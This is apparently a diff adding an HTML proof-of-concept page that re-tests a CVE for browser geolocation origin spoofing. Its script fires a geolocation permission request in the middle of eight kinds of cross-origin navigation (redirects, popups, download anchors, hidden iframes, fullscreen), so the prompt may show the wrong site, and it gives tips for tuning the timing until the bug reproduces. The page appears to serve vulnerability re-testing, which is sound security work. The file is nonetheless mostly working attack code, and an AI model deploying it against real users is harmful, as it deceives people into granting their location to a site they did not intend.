@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PoC 02 - Geolocation Origin Spoof</title>
+<style>
+  body{font-family:-apple-system,Helvetica,Arial,sans-serif;margin:0;padding:12px;background:#f2f2f7;color:#111}
+  h1{font-size:17px;margin:0 0 4px}
+  .sub{font-size:12px;color:#666}
+  label{font-size:12px;display:block;margin:8px 0 2px}
+  input{width:100%;box-sizing:border-box;padding:8px;font-size:13px;border:1px solid #ccc;border-radius:8px}
+  .grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:10px 0}
+  button{padding:12px 8px;font-size:13px;border:none;border-radius:9px;background:#007aff;color:#fff}
+  #log{background:#000;color:#0f0;font-family:ui-monospace,Menlo,monospace;font-size:11px;padding:8px;border-radius:8px;height:200px;overflow:auto;white-space:pre-wrap;margin-top:8px}
+  .note{font-size:11px;color:#900;background:#fff3f2;padding:8px;border-radius:8px;margin-top:8px}
+</style>
+</head>
+<body>
+<h1>PoC 02 — Geolocation Origin Spoof</h1>
+<p class="sub">Re-test of CVE-2025-30466. Host THIS page on domain A. Point "transition target" at a SLOW (~5s) resource/download on domain B. Oracle = which origin the location prompt shows. If it shows B (or blank) instead of A, that is a spoof.</p>
+
+<label>Transition target (domain B — slow download or redirect)</label>
+<input id="target" value="https://issues.chromium.org/action/issues/364223634/attachments/59111972?download=true">
+<label>Delay before firing geolocation prompt (ms)</label>
+<input id="delay" type="number" value="399">
+
+<div class="grid">
+  <button onclick="run('assign')">A: location.href = target</button>
+  <button onclick="run('replace')">B: location.replace</button>
+  <button onclick="run('open')">C: window.open popup</button>
+  <button onclick="run('anchor')">D: anchor[download] click</button>
+  <button onclick="run('metarefresh')">E: meta refresh</button>
+  <button onclick="run('form')">F: form submit → B</button>
+  <button onclick="run('iframe')">G: iframe → B nav</button>
+  <button onclick="run('fullscreen')">H: fullscreen + geo</button>
+</div>
+<button style="width:100%" onclick="geoOnly()">Baseline: geolocation with NO transition (should show A)</button>
+
+<div id="log"></div>
+<button style="margin-top:8px" onclick="navigator.clipboard.writeText(document.getElementById('log').textContent)">Copy log</button>
+<p class="note">Tip: the original bug needed a transition slow enough that the prompt renders mid-flight. If it doesn't repro, raise the delay and use a slower target. Screen-record so you can freeze-frame the prompt's origin line.</p>
+
+<script>
+const logEl=document.getElementById('log');
+const ts=()=>new Date().toISOString().substr(11,12);
+const log=m=>{logEl.textContent+=`[${ts()}] ${m}\n`;logEl.scrollTop=logEl.scrollHeight};
+const T=()=>document.getElementById('target').value;
+const D=()=>parseInt(document.getElementById('delay').value)||0;
+
+function fireGeo(tag){
+  log(`(+${D()}ms) firing geolocation [${tag}] — CHECK PROMPT ORIGIN NOW`);
+  navigator.geolocation.getCurrentPosition(
+    p=>log(`  geo granted ${p.coords.latitude.toFixed(3)},${p.coords.longitude.toFixed(3)}`),
+    e=>log(`  geo err ${e.code} ${e.message}`),
+    {timeout:20000,enableHighAccuracy:true});
+}
+
+function run(kind){
+  log(`--- transition: ${kind} -> ${T()} ---`);
+  const d=D();
+  switch(kind){
+    case 'assign': setTimeout(()=>fireGeo(kind),d); location.href=T(); break;
+    case 'replace': setTimeout(()=>fireGeo(kind),d); location.replace(T()); break;
+    case 'open': { const w=window.open(T(),'_blank'); setTimeout(()=>fireGeo(kind),d); break; }
+    case 'anchor': { const a=document.createElement('a');a.href=T();a.download='';a.rel='noopener';document.body.appendChild(a);a.click();setTimeout(()=>fireGeo(kind),d);break; }
+    case 'metarefresh': { const m=document.createElement('meta');m.httpEquiv='refresh';m.content='0;url='+T();document.head.appendChild(m);setTimeout(()=>fireGeo(kind),d);break; }
+    case 'form': { const f=document.createElement('form');f.method='GET';f.action=T();document.body.appendChild(f);f.submit();setTimeout(()=>fireGeo(kind),d);break; }
+    case 'iframe': { let f=document.getElementById('hf'); if(!f){f=document.createElement('iframe');f.id='hf';f.style.cssText='width:1px;height:1px;position:absolute;left:-9999px';document.body.appendChild(f);} f.src=T(); setTimeout(()=>fireGeo(kind),d); break; }
+    case 'fullscreen': { (document.documentElement.requestFullscreen?document.documentElement.requestFullscreen():Promise.resolve()).finally(()=>setTimeout(()=>fireGeo(kind),d)); break; }
+  }
+}
+function geoOnly(){log('--- baseline, no transition ---');fireGeo('baseline')}
+document.body.onclick=()=>{}; // some iOS gestures need a user activation before nav
+log('ready. origin(A) = '+location.origin+' | secure='+window.isSecureContext);
+</script>
+</body>
+</html>
